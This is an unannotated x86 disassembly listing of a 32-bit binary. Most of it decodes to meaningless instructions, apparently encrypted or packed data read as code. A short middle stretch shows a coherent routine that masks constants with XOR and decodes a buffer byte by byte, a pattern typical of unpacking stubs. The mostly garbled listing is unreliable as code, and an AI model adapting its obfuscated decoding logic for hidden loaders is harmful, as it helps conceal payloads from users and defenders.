  4059c7:	or     dl,BYTE PTR [ecx+0x53]
  4059ca:	xchg   edi,eax
  4059cb:	mov    ds:0x8f161c19,eax
  4059d0:	jmp    0x5fd1:0x1178b3e1
  4059d7:	(bad)  
  4059d8:	sar    DWORD PTR [eax],1
  4059da:	pop    esp
  4059db:	add    ch,al
  4059dd:	nop
  4059de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059df:	aad    0x1b
  4059e1:	out    0x8f,al
  4059e3:	outs   dx,BYTE PTR ds:[esi]
  4059e4:	inc    ecx
  4059e5:	sub    eax,0x9e2ab868
  4059ea:	mov    BYTE PTR [ebx],0x81
  4059ed:	cmc    
  4059ee:	adc    cl,BYTE PTR [eax]
  4059f0:	inc    ebp
  4059f1:	je     0x4059af
  4059f3:	mov    dl,0x10
  4059f5:	pop    esp
  4059f6:	push   es
  4059f7:	sti    
  4059f8:	stos   BYTE PTR es:[edi],al
  4059f9:	lods   al,BYTE PTR ds:[esi]
  4059fa:	inc    ecx
  4059fb:	add    bh,0x19
  4059fe:	adc    DWORD PTR [edx],esp
  405a00:	out    0x13,eax
  405a02:	push   ecx
  405a03:	aam    0xb2
  405a05:	xchg   ebx,eax
  405a06:	mov    cl,0xc7
  405a08:	pcmpeqw mm2,QWORD PTR [eax+0x73251d82]
  405a0f:	les    esp,FWORD PTR [ebp-0x514482dd]
  405a15:	dec    esp
  405a16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a17:	rol    DWORD PTR [ebp-0x6063cd28],1
  405a1d:	inc    esi
  405a1e:	xor    esp,edx
  405a20:	mov    ebp,0x8d041d8c
  405a25:	into   
  405a26:	jno    0x4059aa
  405a28:	out    dx,eax
  405a29:	cwde   
  405a2a:	add    dl,BYTE PTR [edx+0x15]
  405a2d:	or     bl,bl
  405a2f:	inc    eax
  405a30:	add    eax,0xe809f841
  405a35:	test   eax,0xe3946628
  405a3a:	add    DWORD PTR [edx],ebx
  405a3c:	mov    ah,BYTE PTR [edx]
  405a3e:	jmp    0x52c7:0x8fe353ea
  405a45:	clc    
  405a46:	rcr    DWORD PTR [ebx],0x8c
  405a49:	sbb    DWORD PTR [esi+0x45e91ff6],0xfffffffd
  405a50:	xlat   BYTE PTR ds:[ebx]
  405a51:	push   es
  405a52:	loop   0x4059de
  405a54:	adc    ebp,DWORD PTR [edx-0x12]
  405a57:	(bad)  
  405a58:	dec    esi
  405a59:	or     cl,BYTE PTR [esi]
  405a5b:	test   al,0xa8
  405a5d:	pop    ss
  405a5e:	xor    BYTE PTR [ecx],0x70
  405a61:	push   ebx
  405a62:	sub    al,0x9c
  405a64:	push   ecx
  405a65:	(bad)  
  405a66:	nop
  405a67:	add    eax,0x1880b0e5
  405a6c:	aad    0x5a
  405a6e:	jmp    0x32a6b2f0
  405a73:	inc    ebx
  405a74:	outs   dx,DWORD PTR ds:[esi]
  405a75:	(bad)  
  405a76:	push   cs
  405a77:	adc    edi,ebx
  405a79:	in     eax,dx
  405a7a:	jb     0x405a09
  405a7c:	fsub   DWORD PTR [eax]
  405a7e:	dec    edx
  405a7f:	out    dx,al
  405a80:	mov    esi,0xbe373c15
  405a85:	int    0xeb
  405a87:	jne    0x405ae2
  405a89:	sub    al,0x1e
  405a8b:	lahf   
  405a8c:	cmp    eax,0x37c444ae
  405a91:	gs (bad) 
  405a93:	fistp  QWORD PTR [esi+0x39]
  405a96:	xchg   ebx,eax
  405a97:	bound  eax,QWORD PTR [ebx+0x25]
  405a9a:	push   ss
  405a9b:	test   eax,0xc2b36164
  405aa0:	mov    eax,ds:0xd4d8bc7c
  405aa5:	jecxz  0x405a29
  405aa7:	jo     0x405a3a
  405aa9:	mov    ebp,0x4cea1894
  405aae:	iret   
  405aaf:	nop
  405ab0:	mov    ds:0x8b090463,eax
  405ab5:	add    BYTE PTR [esi+0x3a9e475f],ah
  405abb:	bound  edi,QWORD PTR ds:0x8c5dc391
  405ac1:	lea    ebp,[edi]
  405ac3:	popa   
  405ac4:	cmp    DWORD PTR [edi],edx
  405ac6:	mov    edi,0x4f0cbcd6
  405acb:	mov    esp,0x20866eff
  405ad0:	sbb    al,0x57
  405ad2:	int3   
  405ad3:	pop    ds
  405ad4:	add    esp,DWORD PTR [eax+eiz*4]
  405ad7:	sub    eax,edi
  405ad9:	scas   eax,DWORD PTR es:[edi]
  405ada:	call   0x6c60:0x33fff363
  405ae1:	mov    ds:0x3db94d25,eax
  405ae6:	inc    edi
  405ae7:	sub    al,0xfd
  405ae9:	mov    esi,0x48ba1c8
  405aee:	mov    eax,es
  405af0:	mov    edx,0x3d75ab3c
  405af5:	push   es
  405af6:	push   ebp
  405af8:	in     eax,0xc5
  405afa:	ja     0x405b4b
  405afc:	add    DWORD PTR [esi],esi
  405afe:	mov    edx,0x115ef8bd
  405b03:	test   DWORD PTR [edi-0x50],esp
  405b06:	fwait
  405b07:	xor    ch,BYTE PTR [ebx+edx*2+0x322b44d9]
  405b0e:	iret   
  405b0f:	repnz mov dl,0xf0
  405b12:	out    dx,eax
  405b13:	push   cs
  405b14:	repnz or DWORD PTR [esi-0x500d7de7],esp
  405b1b:	push   0x7c5ee59d
  405b20:	fs push esp
  405b22:	pop    ecx
  405b23:	mov    edx,0x418bc2ba
  405b28:	sbb    esi,DWORD PTR [esi+0x350d082]
  405b2e:	push   ebp
  405b2f:	and    DWORD PTR [ebx-0x61],ebp
  405b32:	inc    eax
  405b33:	or     eax,0xd3445bc0
  405b38:	ficomp WORD PTR [ebx-0x52a3e4de]
  405b3e:	sbb    DWORD PTR [ebp+0x57],edx
  405b41:	adc    dh,dl
  405b43:	enter  0xf756,0x63
  405b47:	adc    edx,DWORD PTR [ebx-0x3]
  405b4a:	ins    DWORD PTR es:[edi],dx
  405b4b:	pop    edx
  405b4c:	push   edi
  405b4d:	js     0x405b48
  405b4f:	div    al
  405b51:	add    BYTE PTR [ecx],ah
  405b53:	loope  0x405af1
  405b55:	add    al,0xcc
  405b57:	xor    eax,DWORD PTR [edx-0x630fd497]
  405b5d:	mov    cl,0x0
  405b5f:	scas   eax,DWORD PTR es:[edi]
  405b60:	test   DWORD PTR [esp+eiz*2-0x524632b2],ebx
  405b67:	xchg   edi,eax
  405b68:	mov    ebp,0x521863ef
  405b6d:	pushf  
  405b6e:	loop   0x405b40
  405b70:	fdivrp st(6),st
  405b72:	repnz mov edi,0x39fc5a5
  405b78:	inc    edi
  405b79:	inc    esi
  405b7a:	xor    eax,0xd4abde3e
  405b7f:	xchg   edi,eax
  405b80:	loope  0x405b7c
  405b82:	nop
  405b83:	mov    al,0x4b
  405b85:	loope  0x405b90
  405b87:	inc    edi
  405b88:	jge    0x405b7c
  405b8a:	je     0x405bb4
  405b8c:	push   esp
  405b8d:	sbb    BYTE PTR [edx-0x1f193cf0],0xd1
  405b94:	pop    ebp
  405b95:	js     0x405c05
  405b97:	fs je  0x405b7c
  405b9a:	push   edi
  405b9b:	enter  0x243c,0x2a
  405b9f:	jmp    0x6d4:0xf71ebc9a
  405ba6:	xor    ah,BYTE PTR [edx-0x9b7e85c]
  405bac:	fist   DWORD PTR [edx+0x67]
  405baf:	lea    ebp,[esi+0x23a3f900]
  405bb5:	mov    DWORD PTR [esi],esi
  405bb7:	xchg   ebx,eax
  405bb8:	into   
  405bb9:	mov    al,0x78
  405bbb:	nop
  405bbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bbd:	sub    BYTE PTR [esi-0x20],dh
  405bc0:	mul    DWORD PTR [edi-0x31]
  405bc3:	jmp    0x405bea
  405bc5:	fs stc 
  405bc7:	jp     0x405b8b
  405bc9:	push   eax
  405bca:	cmp    DWORD PTR [ecx],eax
  405bcc:	xchg   edi,eax
  405bcd:	stc    
  405bce:	mov    bl,BYTE PTR [eax]
  405bd0:	ss inc edx
  405bd2:	enter  0x247a,0x66
  405bd6:	dec    ebx
  405bd7:	xchg   edi,eax
  405bd8:	xor    ebp,DWORD PTR [ebx+0x73]
  405bdb:	dec    ebp
  405bdc:	out    0xd5,eax
  405bde:	leave  
  405bdf:	ins    DWORD PTR es:[edi],dx
  405be0:	sub    dh,BYTE PTR [ebx+0x38]
  405be3:	inc    eax
  405be4:	cld    
  405be5:	sub    BYTE PTR [esi-0x63881f7c],ah
  405beb:	cmp    eax,0xbb11b3b9
  405bf0:	aas    
  405bf1:	xchg   esp,eax
  405bf2:	scas   al,BYTE PTR es:[edi]
  405bf3:	cmp    edi,DWORD PTR [edi-0x2376271f]
  405bf9:	popf   
  405bfa:	mov    DWORD PTR [edi+0x4e00dfb3],ebx
  405c00:	push   ds
  405c01:	cmp    BYTE PTR [edi+0x37],al
  405c04:	push   edi
  405c05:	in     eax,dx
  405c06:	addr16 inc esp
  405c08:	test   DWORD PTR [edi-0x1f],ecx
  405c0b:	cmp    al,0x10
  405c0d:	add    eax,0xaac021c4
  405c12:	jmp    0x405c6c
  405c14:	adc    BYTE PTR [edi+ebx*4-0x3e],0x36
  405c19:	pop    edx
  405c1a:	dec    eax
  405c1b:	and    ah,BYTE PTR [edi+0x389a3ed9]
  405c21:	stc    
  405c22:	aaa    
  405c23:	and    DWORD PTR [ebx+0x5025f839],ecx
  405c29:	std    
  405c2a:	iret   
  405c2b:	jge    0x405be8
  405c2d:	or     esp,DWORD PTR [edx-0x8]
  405c30:	xor    al,0xae
  405c32:	pop    edi
  405c33:	loope  0x405be9
  405c35:	jmp    0xcd71:0xa373dfa2
  405c3c:	mov    bl,0xb0
  405c3e:	push   ebx
  405c3f:	in     eax,dx
  405c40:	lahf   
  405c41:	fdiv   DWORD PTR [edi]
  405c43:	xlat   BYTE PTR ds:[ebx]
  405c44:	push   ecx
  405c45:	cdq    
  405c46:	pop    ss
  405c47:	mov    eax,ds:0x7718f8b3
  405c4c:	call   0x74547f9
  405c51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c52:	mov    ch,0xcc
  405c54:	popa   
  405c55:	stc    
  405c56:	imul   edi,DWORD PTR [edx-0x21d6a621],0xffffffdd
  405c5d:	in     al,dx
  405c5e:	dec    edi
  405c5f:	lds    ebp,FWORD PTR [ecx-0x15480b0f]
  405c65:	cld    
  405c66:	stos   BYTE PTR es:[edi],al
  405c67:	shr    BYTE PTR [ebp-0x7d],0x31
  405c6b:	push   ss
  405c6c:	xor    eax,0xf971c722
  405c71:	clc    
  405c72:	dec    eax
  405c73:	dec    ebp
  405c74:	xchg   esp,eax
  405c75:	jno    0x405cbe
  405c77:	ins    DWORD PTR es:[edi],dx
  405c78:	push   ecx
  405c79:	adc    BYTE PTR [edx-0x36],0x23
  405c7d:	mov    BYTE PTR [esi],ah
  405c7f:	out    dx,al
  405c80:	push   ecx
  405c81:	xchg   ebp,eax
  405c82:	pop    es
  405c83:	mov    al,0x23
  405c85:	mov    BYTE PTR [edx],al
  405c87:	jecxz  0x405c53
  405c89:	mov    ecx,0xcc9da26c
  405c8e:	mov    esi,0x3f3645ea
  405c93:	xor    al,0xe4
  405c95:	sbb    ecx,edi
  405c97:	pop    esi
  405c98:	mov    ebp,0xf62df552
  405c9d:	gs xchg esi,eax
  405c9f:	sbb    ah,BYTE PTR [esi+ebx*2]
  405ca2:	(bad)  
  405ca3:	pushf  
  405ca4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ca5:	ds jecxz 0x405c9d
  405ca8:	(bad)  
  405ca9:	fisubr DWORD PTR [edi-0x6d]
  405cac:	or     dh,BYTE PTR [ebp+0x3e409233]
  405cb2:	sub    bl,BYTE PTR [edi-0x4b]
  405cb5:	loope  0x405d30
  405cb7:	mov    dl,0x24
  405cb9:	cwde   
  405cba:	and    esp,eax
  405cbc:	jle    0x405ca2
  405cbe:	lods   eax,DWORD PTR ds:[esi]
  405cbf:	jmp    0xbae773f
  405cc4:	lock loopne 0x405d10
  405cc7:	jge    0x405c77
  405cc9:	jno    0x405d37
  405ccb:	adc    al,0xa3
  405ccd:	aas    
  405cce:	mov    ebp,eax
  405cd0:	push   esp
  405cd1:	lds    esi,FWORD PTR ds:0x3d203420
  405cd7:	inc    edi
  405cd8:	and    dl,BYTE PTR [edx]
  405cda:	cmp    al,0xd5
  405cdc:	jb     0x405d2a
  405cde:	imul   edi,edx,0xffffffcf
  405ce1:	jne    0x405c8e
  405ce3:	inc    eax
  405ce4:	ret    
  405ce5:	sbb    edx,ebp
  405ce7:	xor    ah,al
  405ce9:	sub    eax,0x9eb248ce
  405cee:	jmp    0x26e20b16
  405cf3:	sub    eax,0xd40e3659
  405cf8:	xor    eax,0x699fdeb4
  405cfd:	pop    edx
  405cfe:	inc    edx
  405cff:	xchg   esi,eax
  405d00:	mov    esp,0x960eb543
  405d05:	dec    edx
  405d06:	cld    
  405d07:	or     DWORD PTR [edx],eax
  405d09:	xchg   ecx,eax
  405d0a:	pop    ss
  405d0b:	jae    0x405d51
  405d0d:	mov    bl,0xc7
  405d0f:	xchg   edx,eax
  405d10:	ficomp DWORD PTR [edx]
  405d12:	pop    edi
  405d13:	idiv   DWORD PTR [esi+0x47]
  405d16:	nop
  405d17:	sbb    al,0xd8
  405d19:	push   edx
  405d1a:	xor    al,0x51
  405d1c:	add    eax,0x8b53408f
  405d21:	mov    al,0xbe
  405d23:	in     al,dx
  405d24:	imul   eax,DWORD PTR [ecx-0x7],0x82aa4e41
  405d2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d2c:	mov    eax,ds:0xbaf9ed05
  405d31:	mov    DWORD PTR [eax-0x63cc7ed0],eax
  405d37:	std    
  405d38:	push   ecx
  405d39:	jp     0x405d46
  405d3b:	xchg   ecx,eax
  405d3c:	jl     0x405d2f
  405d3e:	adc    al,0x14
  405d40:	or     eax,0x8d08aaf2
  405d45:	in     eax,dx
  405d46:	xlat   BYTE PTR ds:[ebx]
  405d47:	push   ebp
  405d48:	(bad)  
  405d49:	(bad)  
  405d4a:	pop    eax
  405d4b:	fstp   QWORD PTR ds:0xa8b99577
  405d51:	test   eax,0x292eed07
  405d56:	repnz icebp 
  405d58:	cmp    al,0x1f
  405d5a:	into   
  405d5b:	(bad)  
  405d5c:	and    DWORD PTR [ecx],ebx
  405d5e:	xor    BYTE PTR [esi-0x1e],0xda
  405d62:	ja     0x405de0
  405d64:	fdiv   st(6),st
  405d66:	sbb    DWORD PTR [edi-0x41],edi
  405d69:	mov    DWORD PTR [edi+ebx*8],ecx
  405d6c:	jecxz  0x405d7d
  405d6e:	jp     0x405d31
  405d70:	popf   
  405d71:	xlat   BYTE PTR ds:[ebx]
  405d72:	push   edi
  405d73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d74:	pop    edi
  405d75:	popa   
  405d76:	add    BYTE PTR [edx-0x678fb95d],al
  405d7c:	push   ecx
  405d7d:	in     al,0xb
  405d7f:	scas   al,BYTE PTR es:[edi]
  405d80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d81:	dec    edx
  405d82:	jg     0x405d55
  405d84:	mov    al,BYTE PTR cs:[bp+di]
  405d88:	push   edi
  405d89:	dec    ebx
  405d8a:	or     ebx,DWORD PTR [edx-0x16]
  405d8d:	xchg   esi,eax
  405d8e:	iret   
  405d8f:	xchg   ebp,eax
  405d90:	outs   dx,DWORD PTR ds:[esi]
  405d91:	cmp    dh,bl
  405d93:	sbb    al,BYTE PTR [edx+0x9a9241b]
  405d99:	imul   DWORD PTR [ebx]
  405d9b:	int    0xa
  405d9d:	jecxz  0x405e0f
  405d9f:	sub    esp,DWORD PTR [edi+0x48]
  405da2:	loope  0x405d47
  405da4:	dec    esi
  405da5:	mov    ebp,0x8c62edd8
  405daa:	jnp    0x405db9
  405dac:	std    
  405dad:	and    ch,BYTE PTR [esi-0x6]
  405db0:	xlat   BYTE PTR ds:[ebx]
  405db1:	arpl   WORD PTR [ebp-0xb],di
  405db4:	mov    ebp,esi
  405db6:	(bad)  
  405db7:	rol    DWORD PTR [edi+ebx*2],1
  405dba:	bound  esp,QWORD PTR [eax-0x38]
  405dbd:	clc    
  405dbe:	jb     0x405d79
  405dc0:	push   ebp
  405dc1:	ret    
  405dc2:	mov    esi,edx
  405dc4:	pop    edi
  405dc5:	push   ecx
  405dc6:	sahf   
  405dc7:	dec    edi
  405dc8:	iret   
  405dc9:	mov    ds:0x8166f07a,eax
  405dce:	jbe    0x405d59
  405dd0:	xchg   edi,eax
  405dd1:	sub    ebp,DWORD PTR [ecx+eiz*2]
  405dd4:	mov    al,0x40
  405dd6:	mov    edx,0x4b870894
  405ddb:	in     eax,dx
  405ddc:	cld    
  405ddd:	retf   0xf46a
  405de0:	cmc    
  405de1:	pop    edx
  405de2:	add    esp,0x1c
  405de5:	jae    0x405e21
  405de7:	fistp  DWORD PTR [edi-0x169791e5]
  405ded:	cmp    DWORD PTR [esi+0x11e6b083],esi
  405df3:	je     0x405df9
  405df5:	pop    ebp
  405df6:	dec    edi
  405df7:	xchg   esi,eax
  405df8:	jo     0x405e40
  405dfa:	and    bl,BYTE PTR [edx]
  405dfc:	jae    0x405e78
  405dfe:	js     0x405daf
  405e00:	push   esp
  405e01:	sub    BYTE PTR [eax],cl
  405e03:	jp     0x405dcc
  405e05:	or     DWORD PTR [ebx],edi
  405e07:	jne    0x405dc5
  405e09:	sbb    BYTE PTR [ebp-0x5],ah
  405e0c:	pusha  
  405e0d:	lock xchg edi,eax
  405e0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e10:	fisub  DWORD PTR [eax+ebx*2]
  405e13:	or     al,0x11
  405e15:	and    DWORD PTR [ebx-0x533f656e],esp
  405e1b:	frstor [eax+0x42b5dafa]
  405e21:	push   eax
  405e22:	dec    ebx
  405e23:	lahf   
  405e24:	bt     edi,edi
  405e27:	scas   eax,DWORD PTR es:[edi]
  405e28:	aaa    
  405e29:	fild   QWORD PTR [edx+eiz*4+0x56601152]
  405e30:	(bad)  
  405e31:	into   
  405e32:	jmp    0x9f9f:0xbfce8d4e
  405e39:	inc    ebp
  405e3a:	addr16 mov bh,0x7b
  405e3d:	cs (bad) 
  405e3f:	lahf   
  405e40:	cmp    al,0xcd
  405e42:	pop    es
  405e43:	(bad)  
  405e44:	fstp   QWORD PTR [esi+0x154fc1ac]
  405e4a:	mov    DWORD PTR [eax-0x3a],ebx
  405e4d:	mov    ds:0x1a45d207,eax
  405e52:	clc    
  405e53:	push   edx
  405e54:	dec    edx
  405e55:	sbb    edx,edi
  405e57:	add    DWORD PTR [eax],edx
  405e59:	inc    esi
  405e5a:	pushf  
  405e5b:	retf   
  405e5c:	and    al,0x91
  405e5e:	jmp    0xd204d109
  405e63:	cs test al,0xfc
  405e66:	rcr    al,cl
  405e68:	iret   
  405e69:	in     eax,dx
  405e6a:	mov    edi,0x9e1b0789
  405e6f:	xchg   esi,eax
  405e70:	sar    ah,0xe9
  405e73:	sbb    dl,ch
  405e75:	outs   dx,DWORD PTR ds:[esi]
  405e76:	mov    ebp,0x48ac6762
  405e7b:	or     esi,DWORD PTR [ebp-0x68b81931]
  405e81:	cmc    
  405e82:	in     eax,0x8a
  405e84:	dec    ebp
  405e85:	lods   al,BYTE PTR ds:[esi]
  405e86:	sub    DWORD PTR [edx+ecx*2-0x1d],ebp
  405e8a:	xor    dl,BYTE PTR [esi+0x39]
  405e8d:	mov    dh,0xc9
  405e8f:	popa   
  405e90:	lock or ah,bh
  405e93:	mov    cl,0xdf
  405e95:	inc    ecx
  405e96:	sar    cl,1
  405e98:	mov    ds:0xa854db7f,eax
  405e9d:	outs   dx,BYTE PTR ds:[esi]
  405e9e:	xchg   ebx,eax
  405e9f:	(bad)  
  405ea1:	mov    al,0xc4
  405ea3:	ret    0xebae
  405ea6:	or     DWORD PTR [ebx-0x160731e7],esp
  405eac:	jae    0x405ec2
  405eae:	rol    DWORD PTR [esi+0x134b4291],1
  405eb4:	scas   eax,DWORD PTR es:[edi]
  405eb5:	add    edi,0x53
  405eb8:	rcl    BYTE PTR [ebx],cl
  405eba:	xchg   edx,eax
  405ebb:	je     0x405e83
  405ebd:	aaa    
  405ebe:	pop    ebx
  405ebf:	or     al,0xe
  405ec1:	pop    eax
  405ec2:	or     ch,BYTE PTR [edi-0x4cbd8571]
  405ec8:	xchg   DWORD PTR [edi+0x57],edx
  405ecb:	cwde   
  405ecc:	fmul   st(5),st
  405ece:	(bad)  
  405ecf:	or     BYTE PTR [ecx],dl
  405ed1:	xchg   ecx,eax
  405ed2:	in     eax,dx
  405ed3:	setp   BYTE PTR [ecx-0x40]
  405ed7:	in     al,dx
  405ed8:	lea    eax,[edi]
  405eda:	jg     0x405f53
  405edc:	idiv   DWORD PTR [edx+0x257b8454]
  405ee2:	pop    ecx
  405ee3:	inc    BYTE PTR [eax-0x7b9d0244]
  405ee9:	sti    
  405eea:	pop    edi
  405eeb:	cld    
  405eec:	mov    ecx,0x558dd413
  405ef1:	stc    
  405ef2:	(bad)  
  405ef3:	dec    ebp
  405ef4:	xor    al,0x94
  405ef6:	and    edi,DWORD PTR [edx]
  405ef8:	mov    eax,ds:0xfd4fe6db
  405efd:	xor    ebx,DWORD PTR [ebp-0x5d]
  405f00:	(bad)  
  405f02:	jle    0x405ef9
  405f04:	sub    eax,0xfa0ba828
  405f09:	es fcompp 
  405f0c:	jmp    0x405ead
  405f0e:	inc    esi
  405f0f:	(bad)  
  405f10:	aaa    
  405f11:	bound  edx,QWORD PTR [eax-0x3422514]
  405f17:	repnz (bad) 
  405f19:	xchg   esp,eax
  405f1a:	mov    dl,0x92
  405f1c:	ficomp DWORD PTR [ebx+ebx*4+0x5737905b]
  405f23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f24:	xor    BYTE PTR [ebx+0x32],ah
  405f27:	mov    ecx,0x37d022d5
  405f2c:	sti    
  405f2d:	pop    esi
  405f2e:	cmp    eax,0x374b645a
  405f33:	xor    eax,0x375e447c
  405f38:	xchg   edx,eax
  405f39:	mov    eax,0x7f0d36de
  405f3e:	sar    bh,cl
  405f40:	pop    ebx
  405f41:	in     eax,dx
  405f42:	icebp  
  405f43:	push   ss
  405f44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f45:	outs   dx,DWORD PTR ds:[esi]
  405f46:	test   BYTE PTR [ecx+0x458bd445],cl
  405f4c:	test   al,0x2b
  405f4e:	ror    DWORD PTR [ecx+0x458be445],0xe4
  405f55:	mov    DWORD PTR [ebp-0x14],eax
  405f58:	mov    eax,DWORD PTR [ebp-0x2c]
  405f5b:	mov    DWORD PTR [ebp-0x38],0xf89c85b5
  405f62:	mov    DWORD PTR [ebp-0x54],eax
  405f65:	mov    DWORD PTR [ebp-0x20],0xf89c85b4
  405f6c:	mov    eax,DWORD PTR [ebp-0x38]
  405f6f:	xor    eax,esi
  405f71:	add    eax,edi
  405f73:	mov    DWORD PTR [ebp-0x10],eax
  405f76:	mov    eax,DWORD PTR [ebp-0x38]
  405f79:	xor    eax,esi
  405f7b:	add    eax,edi
  405f7d:	mov    DWORD PTR [ebp-0x8],eax
  405f80:	mov    DWORD PTR [ebp-0x2c],0xf89c8595
  405f87:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  405f8e:	mov    eax,DWORD PTR [ebp-0x38]
  405f91:	mov    edx,DWORD PTR [ebp-0x14]
  405f94:	xor    eax,esi
  405f96:	add    eax,edi
  405f98:	cmp    edx,eax
  405f9a:	je     0x40852b
  405fa0:	mov    eax,DWORD PTR [ebp-0x20]
  405fa3:	xor    eax,esi
  405fa5:	mov    edx,0xffcd8d06
  405faa:	sub    edx,eax
  405fac:	add    edx,DWORD PTR [ebp-0x14]
  405faf:	mov    eax,DWORD PTR [ebp-0x20]
  405fb2:	mov    ebx,DWORD PTR [ebp-0x10]
  405fb5:	xor    eax,esi
  405fb7:	add    eax,edi
  405fb9:	imul   eax,ebx
  405fbc:	cmp    eax,edx
  405fbe:	ja     0x408528
  405fc4:	mov    edx,DWORD PTR [ebp-0x10]
  405fc7:	mov    eax,DWORD PTR [ebp-0x14]
  405fca:	mov    ebx,DWORD PTR [ebp-0x2c]
  405fcd:	sub    eax,edx
  405fcf:	xor    ebx,esi
  405fd1:	xor    edx,edx
  405fd3:	add    ebx,edi
  405fd5:	div    ebx
  405fd7:	mov    DWORD PTR [ebp-0x8],eax
  405fda:	mov    eax,DWORD PTR [ebp-0x44]
  405fdd:	mov    edx,DWORD PTR [ebp-0x8]
  405fe0:	xor    eax,esi
  405fe2:	add    eax,edi
  405fe4:	cmp    edx,eax
  405fe6:	jbe    0x405ff6
  405fec:	mov    eax,DWORD PTR [ebp-0x44]
  405fef:	xor    eax,esi
  405ff1:	add    eax,edi
  405ff3:	mov    DWORD PTR [ebp-0x8],eax
  405ff6:	mov    eax,DWORD PTR [ebp-0x2c]
  405ff9:	mov    edx,DWORD PTR [ebp-0x8]
  405ffc:	xor    eax,esi
  405ffe:	add    eax,edi
  406000:	imul   eax,edx
  406003:	mov    DWORD PTR [ebp-0x8],eax
  406006:	mov    eax,DWORD PTR [ebp-0x38]
  406009:	mov    edx,DWORD PTR [ebp-0x8]
  40600c:	xor    eax,esi
  40600e:	add    eax,edi
  406010:	cmp    edx,eax
  406012:	je     0x408511
  406018:	mov    eax,DWORD PTR [ebp-0x8]
  40601b:	mov    DWORD PTR [ebp-0x18],eax
  40601e:	mov    eax,DWORD PTR [ebp-0x10]
  406021:	add    eax,DWORD PTR [ebp-0x54]
  406024:	mov    DWORD PTR [ebp-0x1c],0xf89c85b5
  40602b:	mov    DWORD PTR [ebp-0x8],eax
  40602e:	mov    eax,0xf89c85b4
  406033:	mov    DWORD PTR [ebp-0x28],eax
  406036:	mov    DWORD PTR [ebp-0x5c],0xf89c85bb
  40603d:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  406044:	mov    DWORD PTR [ebp-0x30],eax
  406047:	mov    eax,DWORD PTR [ebp-0x1c]
  40604a:	xor    eax,esi
  40604c:	add    eax,edi
  40604e:	jmp    0x4084cd
  406053:	mov    DWORD PTR [ebp-0x4c],0xf89c85a2
  40605a:	mov    DWORD PTR [ebp-0x50],0xf89c85af
  406061:	mov    eax,DWORD PTR [ebp-0x30]
  406064:	mov    edx,DWORD PTR [ebp-0xc]
  406067:	xor    eax,esi
  406069:	add    eax,edi
  40606b:	imul   eax,edx
  40606e:	mov    edx,DWORD PTR [ebp-0x8]
  406071:	mov    al,BYTE PTR [eax+edx*1]
  406074:	mov    BYTE PTR [ebp-0x1],al
  406077:	mov    eax,DWORD PTR [ebp-0x30]
  40607a:	mov    edx,DWORD PTR [ebp-0xc]
  40607d:	xor    eax,esi
  40607f:	add    eax,edi
  406081:	imul   eax,edx
  406084:	mov    edx,DWORD PTR [ebp-0x5c]
  406087:	xor    edx,esi
  406089:	add    eax,edx
  40608b:	mov    edx,DWORD PTR [ebp-0x8]
  40608e:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  406096:	mov    edx,DWORD PTR [ebp-0x4c]
  406099:	xor    edx,esi
  40609b:	lea    eax,[edx+eax*1+0x3272fa]
  4060a2:	movzx  edx,BYTE PTR [ebp-0x1]
  4060a6:	xor    edx,eax
  4060a8:	mov    BYTE PTR [ebp-0x1],dl
  4060ab:	mov    al,BYTE PTR [ebp-0x1]
  4060ae:	mov    edx,DWORD PTR [ebp-0x30]
  4060b1:	mov    ebx,DWORD PTR [ebp-0xc]
  4060b4:	xor    edx,esi
  4060b6:	add    edx,edi
  4060b8:	imul   edx,ebx
  4060bb:	mov    ebx,DWORD PTR [ebp-0x8]
  4060be:	mov    BYTE PTR [edx+ebx*1],al
  4060c1:	mov    eax,DWORD PTR [ebp-0x30]
  4060c4:	mov    edx,DWORD PTR [ebp-0xc]
  4060c7:	xor    eax,esi
  4060c9:	add    eax,edi
  4060cb:	imul   eax,edx
  4060ce:	mov    edx,DWORD PTR [ebp-0x8]
  4060d1:	jmp    0x408469
  4060d6:	leave  
  4060d7:	pop    es
  4060d8:	xchg   DWORD PTR ds:0x47490549,eax
  4060de:	(bad)  
  4060df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060e0:	or     bl,cl
  4060e2:	stc    
  4060e3:	adc    ebx,0x7bc17166
  4060e9:	jnp    0x4060df
  4060eb:	pushf  
  4060ec:	jnp    0x406169
  4060ee:	dec    eax
  4060ef:	fmul   QWORD PTR [esi]
  4060f2:	(bad)  
  4060f3:	push   edx
  4060f4:	mov    esp,0xb3ed1f8e
  4060f9:	pop    esi
  4060fa:	add    esp,DWORD PTR [ecx+0x74]
  4060fd:	cmp    DWORD PTR [edi+0xccb2f49],ebx
  406103:	mov    ds,esi
  406105:	fstp   st(5)
  406107:	js     0x406109
  406109:	sub    al,0xa7
  40610b:	push   edx
  40610c:	or     eax,0xdabf55e
  406111:	repz iret 
  406113:	in     eax,dx
  406114:	adc    dh,BYTE PTR [ebx+esi*2-0x6f]
  406118:	adc    eax,0xede99d42
  40611d:	in     eax,dx
  40611e:	inc    ecx
  40611f:	xchg   ebx,eax
  406120:	xor    eax,0x885abdf7
  406125:	mov    ch,0x41
  406127:	push   es
  406128:	sbb    ah,ch
  40612a:	ss pop ds
  40612c:	nop
  40612d:	or     DWORD PTR [esi],edi
  40612f:	leave  
  406130:	dec    edi
  406131:	loopne 0x40611c
  406133:	pusha  
  406134:	pop    edx
  406135:	out    dx,eax
  406136:	enter  0x4e82,0xf6
  40613a:	xor    BYTE PTR [edx-0x73869a5e],0xf3
  406141:	shl    BYTE PTR [ebx-0x883d449],cl
  406147:	rol    DWORD PTR [eax-0x2c],1
  40614a:	pop    ds
  40614b:	ss inc ecx
  40614d:	addr16 dec edx
  40614f:	dec    ebp
  406150:	push   es
  406151:	inc    ecx
  406152:	inc    ebp
